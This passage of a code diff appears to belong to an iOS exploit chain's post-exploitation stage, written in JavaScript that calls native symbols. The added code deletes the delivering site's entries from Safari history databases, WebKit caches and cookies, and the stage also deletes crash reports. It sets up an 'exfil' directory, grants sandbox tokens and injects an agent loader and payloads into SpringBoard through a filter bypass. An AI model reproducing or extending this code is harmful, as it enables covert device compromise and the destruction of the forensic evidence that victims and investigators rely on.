+					let rc = Number(Native.callSymbol("sqlite3_step", stmt));
+					if (rc !== 100) break; // SQLITE_ROW
+					let p = Native.callSymbol("sqlite3_column_text", stmt, 0);
+					if (p) out.push(Native.readString(BigInt(p), 256));
+				}
+			} finally {
+				Native.callSymbol("sqlite3_finalize", stmt);
+			}
+			return out;
+		}
+
+		function sqliteColumnNames(db, table) {
+			let cols = [];
+			let stmt = sqlitePrepare(db, "SELECT * FROM " + sqlIdent(table) + " LIMIT 0;");
+			if (!stmt) return cols;
+			try {
+				let count = Number(Native.callSymbol("sqlite3_column_count", stmt));
+				if (count > 80) count = 80;
+				for (let i = 0; i < count; i++) {
+					let p = Native.callSymbol("sqlite3_column_name", stmt, i);
+					if (p) cols.push(Native.readString(BigInt(p), 192));
+				}
+			} finally {
+				Native.callSymbol("sqlite3_finalize", stmt);
+			}
+			return cols;
+		}
+
+		function containsAnyExpr(cols, needles) {
+			let parts = [];
+			for (let col of cols) {
+				for (let n of needles) {
+					if (!n || n.length < 3) continue;
+					parts.push("instr(lower(CAST(" + sqlIdent(col) + " AS TEXT)), " + sqlString(n) + ") > 0");
+				}
+			}
+			if (!parts.length) return "";
+			return "(" + parts.join(" OR ") + ")";
+		}
+
+		function cleanSqliteRows(path, reason) {
+			if (!ENABLE_SAFARI_ORIGIN_DELETE) return false;
+			let basePath = sqliteBasePath(path);
+			let kind = sqliteKind(basePath);
+			if (!kind || kind === "skip-sync-store") {
+				if (kind === "skip-sync-store") LOG("[SAFARI-CLEAN] sqlite skip sync-store path=" + basePath);
+				return false;
+			}
+			if (sqliteCleaned.indexOf(basePath) >= 0) return false;
+			if (!fileExists(basePath)) return false;
+			sqliteCleaned.push(basePath);
+			let db = sqliteOpen(basePath);
+			if (!db) return false;
+			sqliteFiles++;
+			let hostNeedles = [host, host.replace(/\./g, "_"), origin];
+			let pathNeedles = [];
+			if (repoToken && repoToken.length >= 4) {
+				pathNeedles.push(repoToken);
+				pathNeedles.push("/" + repoToken);
+				pathNeedles.push(sitePath);
+			}
+			let rowMode = (kind === "origin" || !pathNeedles.length) ? "origin" : "path";
+			LOG("[SAFARI-CLEAN] sqlite clean start kind=" + kind + " mode=" + rowMode + " reason=" + reason + " path=" + basePath);
+			try {
+				if (kind === "history-path") {
+					let urlCond = containsAnyExpr(["url"], hostNeedles);
+					let pathCond = rowMode === "path" ? containsAnyExpr(["url"], pathNeedles) : "";
+					let where = pathCond ? "(" + urlCond + " AND " + pathCond + ")" : urlCond;
+					if (where) {
+						let r1 = sqliteExec(db, "DELETE FROM history_visits WHERE history_item IN (SELECT id FROM history_items WHERE " + where + ");", "history_visits");
+						let r2 = sqliteExec(db, "DELETE FROM history_items WHERE " + where + ";", "history_items");
+						sqliteRows += r1.changes + r2.changes;
+					}
+				}
+				let tables = sqliteCollectFirstColumn(db, "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%';", 80);
+				for (let table of tables) {
+					let cols = sqliteColumnNames(db, table);
+					if (!cols.length) continue;
+					let hostExpr = containsAnyExpr(cols, hostNeedles);
+					if (!hostExpr) continue;
+					let whereExpr = hostExpr;
+					if (rowMode === "path") {
+						let pathExpr = containsAnyExpr(cols, pathNeedles);
+						if (!pathExpr) continue;
+						whereExpr = "(" + hostExpr + " AND " + pathExpr + ")";
+					}
+					let res = sqliteExec(db, "DELETE FROM " + sqlIdent(table) + " WHERE " + whereExpr + ";", table);
+					if (res.changes > 0) {
+						sqliteRows += res.changes;
+						LOG("[SAFARI-CLEAN] sqlite table-clean table=" + table + " rows=" + res.changes + " path=" + basePath);
+					}
+				}
+				sqliteExec(db, "PRAGMA wal_checkpoint(TRUNCATE);", "wal_checkpoint_truncate");
+				LOG("[SAFARI-CLEAN] sqlite clean done path=" + basePath);
+				return true;
+			} finally {
+				Native.callSymbol("sqlite3_close", db);
+			}
+		}
+
+	function bytesToLowerSearchString(buff, len) {
+		let bytes = new Uint8Array(buff);
+		let out = "";
+		for (let i = 0; i < len; i++) {
+			let c = bytes[i];
+			if (c >= 65 && c <= 90) c += 32;
+			out += (c >= 32 && c <= 126) ? String.fromCharCode(c) : "\0";
+		}
+		return out;
+	}
+
+	function shouldContentScan(path) {
+		let lower = String(path || "").toLowerCase();
+		if (lower.indexOf("/webkit/") < 0 && lower.indexOf("/safari/") < 0 && lower.indexOf("/cookies/") < 0) return false;
+		if (lower.indexOf("/bookmarks.db") >= 0 || lower.indexOf("/cloudtabs.db") >= 0) return false;
+		if (lower.indexOf(".png") >= 0 || lower.indexOf(".jpg") >= 0 || lower.indexOf(".jpeg") >= 0 || lower.indexOf(".gif") >= 0 || lower.indexOf(".mp4") >= 0) return false;
+		return true;
+	}
+
+	function shouldDeleteContentHit(path) {
+		if (!ENABLE_SAFARI_ORIGIN_DELETE) return false;
+		let lower = String(path || "").toLowerCase();
+		if (sqliteKind(path)) return false;
+		if (lower.indexOf("/cookies/") >= 0 || lower.indexOf("/safari/") >= 0) return false;
+		return lower.indexOf("/caches/") >= 0 || lower.indexOf("/webkit/") >= 0;
+	}
+
+	function treeRootForContentHit(path) {
+		if (!ENABLE_SAFARI_ORIGIN_DELETE) return "";
+		let lower = String(path || "").toLowerCase();
+		let recordsMarker = "/records/";
+		let recordsPos = lower.indexOf(recordsMarker);
+		if (lower.indexOf("/networkcache/") >= 0 && recordsPos >= 0) {
+			let start = recordsPos + recordsMarker.length;
+			let slash = String(path).indexOf("/", start);
+			if (slash > start) return String(path).slice(0, slash);
+		}
+		let defaultMarker = "/websitedata/default/";
+		let defaultPos = lower.indexOf(defaultMarker);
+		if (defaultPos >= 0) {
+			let start = defaultPos + defaultMarker.length;
+			let slash = String(path).indexOf("/", start);
+			if (slash > start) return String(path).slice(0, slash);
+		}
+		return "";
+	}
+
+	function scanFileContent(path) {
+		if (!shouldContentScan(path)) return null;
+		if (contentScannedFiles >= MAX_CONTENT_SCAN_FILES || contentScannedBytes >= MAX_TOTAL_CONTENT_SCAN_BYTES) {
+			contentTruncated = true;
+			return null;
+		}
+		let fd = Native.callSymbol("open", path, 0);
+		if (Number(fd) < 0) return null;
+		let buf = Native.callSymbol("malloc", 4096n);
+		if (!buf || buf === 0n) {
+			Native.callSymbol("close", fd);
+			return null;
+		}
+		contentScannedFiles++;
+		let readForFile = 0;
+		let carry = "";
+		let result = null;
+		try {
+			while (readForFile < MAX_CONTENT_SCAN_BYTES_PER_FILE && contentScannedBytes < MAX_TOTAL_CONTENT_SCAN_BYTES) {
+				let want = 4096;
+				let remainingFile = MAX_CONTENT_SCAN_BYTES_PER_FILE - readForFile;
+				let remainingTotal = MAX_TOTAL_CONTENT_SCAN_BYTES - contentScannedBytes;
+				if (want > remainingFile) want = remainingFile;
+				if (want > remainingTotal) want = remainingTotal;
+				if (want <= 0) break;
+				let got = Native.callSymbol("read", fd, buf, want);
+				let gotNum = Number(got);
+				if (gotNum <= 0) break;
+				let chunk = carry + bytesToLowerSearchString(Native.read(buf, gotNum), gotNum);
+				readForFile += gotNum;
+				contentScannedBytes += gotNum;
+				result = matchCandidate(chunk);
+				if (result) break;
+				carry = chunk.slice(-384);
+			}
+			if (!result && readForFile >= MAX_CONTENT_SCAN_BYTES_PER_FILE) contentTruncated = true;
+		} finally {
+			Native.callSymbol("free", buf);
+			Native.callSymbol("close", fd);
+		}
+			if (result) {
+				contentHits++;
+				let action = "audit";
+				let kind = sqliteKind(path);
+				let treeRoot = treeRootForContentHit(path);
+				if (ENABLE_SAFARI_ORIGIN_DELETE && kind && kind !== "skip-sync-store") action = "sqlite-clean";
+				else if (treeRoot) action = "queue-tree-delete";
+				else if (shouldDeleteContentHit(path)) action = "delete-file";
+				LOG("[SAFARI-CLEAN] content-hit scope=" + result.scope + " token=" + result.token + " bytes=" + readForFile + " action=" + action + " path=" + path);
+				if (action === "sqlite-clean") cleanSqliteRows(path, "content-hit");
+				else if (action === "queue-tree-delete") queueTreeDelete(treeRoot, "content-hit");
+				else if (action === "delete-file") unlinkPath(path);
+			}
+			return result;
+		}
+
+	function scanDir(dirPath, depth, maxDepth) {
+		if (scanned >= MAX_SCAN_ENTRIES) {
+			truncated = true;
+			return;
+		}
+		let dir = Native.callSymbol("opendir", dirPath);
+		if (!dir) {
+			if (depth === 0) LOG("[SAFARI-CLEAN] root unavailable errno=" + getErrno() + " path=" + dirPath);
+			return;
+		}
+		try {
+			while (scanned < MAX_SCAN_ENTRIES) {
+				let entPtr = Native.callSymbol("readdir", dir);
+				if (!entPtr) break;
+				let ent = readDirent(entPtr);
+				if (!ent || !ent.name || ent.name === "." || ent.name === "..") continue;
+				let fullPath = dirPath;
+				if (fullPath.charAt(fullPath.length - 1) !== "/") fullPath += "/";
+				fullPath += ent.name;
+				scanned++;
+				if (isUnderQueuedTreeDelete(fullPath)) continue;
+				let dirEntry = isDirPath(fullPath, ent.type);
+				let match = matchCandidate(fullPath);
+				let deletedEntry = false;
+				if (match) deletedEntry = logCandidate(fullPath, match, dirEntry);
+				if (deletedEntry) continue;
+				if (!dirEntry) scanFileContent(fullPath);
+				if (dirEntry && depth < maxDepth) scanDir(fullPath, depth + 1, maxDepth);
+				if (scanned >= MAX_SCAN_ENTRIES) break;
+			}
+		} finally {
+			Native.callSymbol("closedir", dir);
+		}
+	}
+
+	function rootExists(path) {
+		let dir = Native.callSymbol("opendir", path);
+		if (!dir) return false;
+		Native.callSymbol("closedir", dir);
+		return true;
+	}
+
+	function addRoot(path, depth) {
+		for (let root of roots) {
+			if (root.path === path) return;
+		}
+		roots.push({ path: path, depth: depth });
+		LOG("[SAFARI-CLEAN] discovered scan root path=" + path + " depth=" + depth);
+	}
+
+	function discoverAppContainerRoots(basePath) {
+		let dir = Native.callSymbol("opendir", basePath);
+		if (!dir) {
+			LOG("[SAFARI-CLEAN] app-container root unavailable errno=" + getErrno() + " path=" + basePath);
+			return;
+		}
+		let checked = 0;
+		let added = 0;
+		try {
+			while (checked < 180) {
+				let entPtr = Native.callSymbol("readdir", dir);
+				if (!entPtr) break;
+				let ent = readDirent(entPtr);
+				if (!ent || !ent.name || ent.name === "." || ent.name === "..") continue;
+				if (!isDirPath(basePath + ent.name, ent.type)) continue;
+				checked++;
+				let containerPath = basePath + ent.name + "/";
+					let safariContainer = rootExists(containerPath + "Library/Safari/") || rootExists(containerPath + "Library/Caches/com.apple.mobilesafari/");
+					if (!safariContainer) continue;
+					let candidates = [
+						{ path: containerPath + "Library/WebKit/WebsiteDataStore/", depth: 8 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/", depth: 8 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/Default/", depth: 6 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/IndexedDB/", depth: 6 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/LocalStorage/", depth: 5 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 4 },
+					{ path: containerPath + "Library/Safari/", depth: 5 },
+					{ path: containerPath + "Library/Caches/com.apple.mobilesafari/", depth: 5 },
+					{ path: containerPath + "Library/Caches/com.apple.WebKit.Networking/", depth: 6 },
+					{ path: containerPath + "Library/Caches/WebKit/", depth: 6 },
+					{ path: containerPath + "Library/Caches/WebKit/NetworkCache/", depth: 5 },
+					{ path: containerPath + "Library/Caches/WebKit/ServiceWorkers/", depth: 5 },
+					{ path: containerPath + "Library/Cookies/", depth: 3 }
+				];
+				for (let candidate of candidates) {
+					if (rootExists(candidate.path)) {
+						tokenForPath(candidate.path);
+						addRoot(candidate.path, candidate.depth);
+						added++;
+					}
+				}
+			}
+		} finally {
+			Native.callSymbol("closedir", dir);
+		}
+		LOG("[SAFARI-CLEAN] app-container discovery base=" + basePath + " checked=" + checked + " added=" + added);
+	}
+
+	discoverAppContainerRoots("/private/var/mobile/Containers/Data/Application/");
+	discoverAppContainerRoots("/var/mobile/Containers/Data/Application/");
+
+	for (let root of roots) {
+		scanDir(root.path, 0, root.depth);
+	}
+
+	for (let store of recordStores) {
+		if (fileExists(store)) {
+			LOG("[SAFARI-CLEAN] record-store action=" + (ENABLE_SAFARI_ORIGIN_DELETE ? "sqlite-clean" : "audit-row-filter-needed") + " path=" + store + " host=" + host);
+			scanFileContent(store);
+			cleanSqliteRows(store, "record-store");
+		}
+	}
+
+	flushQueuedTreeDeletes();
+
+	LOG("[SAFARI-CLEAN] audit done scanned=" + scanned + " candidates=" + candidates + " logged=" + candidateLogs + " truncated=" + truncated + " contentFiles=" + contentScannedFiles + " contentBytes=" + contentScannedBytes + " contentHits=" + contentHits + " contentTruncated=" + contentTruncated + " deletedPaths=" + deletedPaths + " deleteErrors=" + deleteErrors + " queuedTreeDeletes=" + queuedTreeDeletes.length + " queuedTreeDeleted=" + queuedTreeDeleted + " sqliteFiles=" + sqliteFiles + " sqliteRows=" + sqliteRows + " sqliteErrors=" + sqliteErrors);
+	return true;
+}
+
+
 function start() {
 	// Redefine LOG to also call syslog() so all post-exploit logging
 	// reaches idevicesyslog. console.log from an injected JSC context
@@ -8800,39 +9796,75 @@ function start() {
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
+	chainStatusInitLog();
 
 	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
 	let filzaDst = "/private/var/mobile/Media/Downloads/";
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
+	LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
 
-	LOG("[PE] Creating agent loader for " + targetProcess); let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
+	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
+	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
+		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
+	}
+
+
 	let agentPid = 0;
-	try {
-		if (agentLoader.inject()) { LOG("[+] Agent loader injected");
-			agentPid = agentLoader.task.pid();
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
-			if (ENABLE_CORUNA_TWEAKLOADER)
-				injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
-			else
-				LOG("[PE] Coruna tweakloader disabled");
-			let springboardTweakInjected = false;
-			if (ENABLE_SPRINGBOARD_JS_TWEAK)
-				springboardTweakInjected = injectLightweightSpringBoardPayload(agentLoader.task, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
-			else
-				LOG("[PE] SpringBoard JS tweak disabled");
-			if (springboardTweakInjected && !ENABLE_POWERCUFF_TWEAK && SBCUST_ONLY_SETTLE_DELAY_USEC > 0n) {
-				LOG("[PE] SpringBoard-only mode: waiting " + SBCUST_ONLY_SETTLE_DELAY_USEC.toString() + " usec for async main-thread dispatch to settle");
-				libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
-			}
+	if (ENABLE_SPRINGBOARD_AGENT) {
+		let agentLoader = null;
+		try {
+			LOG("[PE] SpringBoard agent required: coruna=" + ENABLE_CORUNA_TWEAKLOADER + " js=" + ENABLE_SPRINGBOARD_JS_TWEAK + " overlay=" + ENABLE_CHAIN_STATUS_OVERLAY);
+			LOG("[PE] Creating agent loader for " + targetProcess);
+			agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
+			LOG("[PE] Agent loader created, calling inject()...");
+			let agentInjected = agentLoader.inject();
+			LOG("[PE] Agent loader inject result: " + agentInjected);
+			if (agentInjected) {
+				LOG("[+] Agent loader injected");
+				agentPid = agentLoader.task.pid();
+				LOG("[PE] Agent loader pid=" + agentPid + "; applying sandbox tokens");
+				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
+				LOG("[PE] Agent loader tokens applied; adjusting memory pressure");
+				libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
+				if (ENABLE_CHAIN_STATUS_OVERLAY)
+					injectChainStatusOverlay(agentLoader.task, migFilterBypass, agentPid);
+				else
+					LOG("[PE] Chain status overlay disabled");
+				if (ENABLE_CORUNA_TWEAKLOADER)
+					injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
+				else
+					LOG("[PE] Coruna tweakloader disabled");
+				let springboardTweakInjected = false;
+				if (ENABLE_SPRINGBOARD_JS_TWEAK)
+					springboardTweakInjected = injectLightweightSpringBoardPayload(agentLoader.task, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
+				else
+					LOG("[PE] SpringBoard JS tweak disabled");
+				if (springboardTweakInjected && !ENABLE_POWERCUFF_TWEAK && SBCUST_ONLY_SETTLE_DELAY_USEC > 0n) {
+					LOG("[PE] SpringBoard-only mode: waiting " + SBCUST_ONLY_SETTLE_DELAY_USEC.toString() + " usec for async main-thread dispatch to settle");
+					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
+				}
 
-		} else {
-			LOG("[PE] Agent loader inject failed");
+			} else {
+				LOG("[PE] Agent loader inject failed");
+			}
+		} catch (agentErr) {
+			LOG("[PE] Agent loader exception: " + String(agentErr));
+			LOG("[PE] Agent loader stack: " + (agentErr.stack || "no stack"));
+		} finally {
+			if (agentLoader) {
+				LOG("[PE] Destroying agent loader");
+				try {
+					agentLoader.destroy();
+					LOG("[PE] Agent loader destroyed");
+				} catch (destroyErr) {
+					LOG("[PE] Agent loader destroy exception: " + String(destroyErr));
+				}
+			}
 		}
-	} finally {
-		agentLoader.destroy();
+	} else {
+		LOG("[PE] SpringBoard agent loader skipped (no SpringBoard payload enabled)");
 	}
 
 		if (ENABLE_POWERCUFF_TWEAK)
